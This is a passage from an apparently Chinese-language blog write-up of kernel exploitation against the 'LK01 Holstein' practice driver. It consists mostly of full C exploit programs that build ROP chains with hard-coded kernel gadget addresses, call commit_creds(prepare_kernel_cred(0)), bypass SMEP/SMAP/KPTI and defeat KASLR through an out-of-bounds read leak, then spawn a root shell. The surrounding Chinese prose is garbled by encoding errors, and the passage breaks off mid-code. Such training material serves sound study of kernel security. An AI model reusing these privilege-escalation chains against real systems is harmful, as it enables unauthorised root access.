class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[+] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">getRootPrivilige</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>prepare_kernel_cred_addr<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>commit_creds_addr<span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"Open Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x80</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>ropchain<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>prepare_kernel_cred_addr<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RCX_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_RDI_RAX_REP_MOVSQ_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>commit_creds_addr<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>SWAPGS_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>IRETQ_POP_RBP_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>getRootShell<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> ropchain<span class="token punctuation">,</span> <span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="ä¸‰ã€LK01-Holstein-v1-smep-smap-kpti"><a href="#ä¸‰ã€LK01-Holstein-v1-smep-smap-kpti" class="headerlink" title="ä¸‰ã€LK01 Holstein v1 +smep, +smap,  kpti"></a>ä¸‰ã€LK01 Holstein v1 +smep, +smap,  kpti</h1><p>ç”¨<code>swapgs_restore_regs_and_return_to_usermode()</code>æ¥é™è½ç”¨æˆ·æ€</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//gcc exp.c -o exp -static -masm=intel</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SWAPGS_RET</span> <span class="token expression"><span class="token number">0xffffffff8160bf7e</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IRETQ_POP_RBP_RET</span> <span class="token expression"><span class="token number">0xffffffff810202af</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff8127bbdc</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RDI_RAX_REP_MOVSQ_RET</span> <span class="token expression"><span class="token number">0xffffffff8160c96b</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RCX_RET</span> <span class="token expression"><span class="token number">0xffffffff812ea083</span><span class="token punctuation">;</span></span></span><span class="token class-name">size_t</span> prepare_kernel_cred_addr<span class="token operator">=</span><span class="token number">0xffffffff8106e240</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds_addr<span class="token operator">=</span><span class="token number">0xffffffff8106e390</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81800e10</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> kernel_base<span class="token operator">=</span><span class="token number">0xffffffffc0000000</span><span class="token punctuation">;</span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[+] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">getRootPrivilige</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>prepare_kernel_cred_addr<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>commit_creds_addr<span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"Open Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x80</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>ropchain<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>prepare_kernel_cred_addr<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RCX_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_RDI_RAX_REP_MOVSQ_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>commit_creds_addr<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span><span class="token number">22</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>getRootShell<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> ropchain<span class="token punctuation">,</span> <span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="å››ã€LK01-Holstein-v1-smep-smap-kpti-kaslr"><a href="#å››ã€LK01-Holstein-v1-smep-smap-kpti-kaslr" class="headerlink" title="å››ã€LK01 Holstein v1 +smep, +smap,  kpti,  kaslr"></a>å››ã€LK01 Holstein v1 +smep, +smap,  kpti,  kaslr</h1><p>å¯ä»¥åˆ©ç”¨module_readçš„è¶Šç•Œè¯»å¾—åˆ°çœŸå®åœ°å€ï¼Œä»¥æ­¤å®ç°â€œå»kaslrâ€</p><p>åœ¨0x408å¤„åˆšå¥½èƒ½è¯»åˆ°è¿”å›åœ°å€ï¼š0xffffffff8113d33c (vfs_read+172)ï¼Œæ³„éœ²äº†å†…æ ¸åŸºåœ°å€</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//gcc exp.c -o exp -static -masm=intel</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SWAPGS_RET</span> <span class="token expression"><span class="token number">0xffffffff8160bf7e</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IRETQ_POP_RBP_RET</span> <span class="token expression"><span class="token number">0xffffffff810202af</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff8127bbdc</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RDI_RAX_REP_MOVSQ_RET</span> <span class="token expression"><span class="token number">0xffffffff8160c96b</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RCX_RET</span> <span class="token expression"><span class="token number">0xffffffff812ea083</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token class-name">size_t</span> prepare_kernel_cred_addr<span class="token operator">=</span><span class="token number">0xffffffff8106e240</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds_addr<span class="token operator">=</span><span class="token number">0xffffffff8106e390</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81800e10</span><span class="token punctuation">;</span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[+] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">getRootPrivilige</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>prepare_kernel_cred_addr<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>commit_creds_addr<span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span 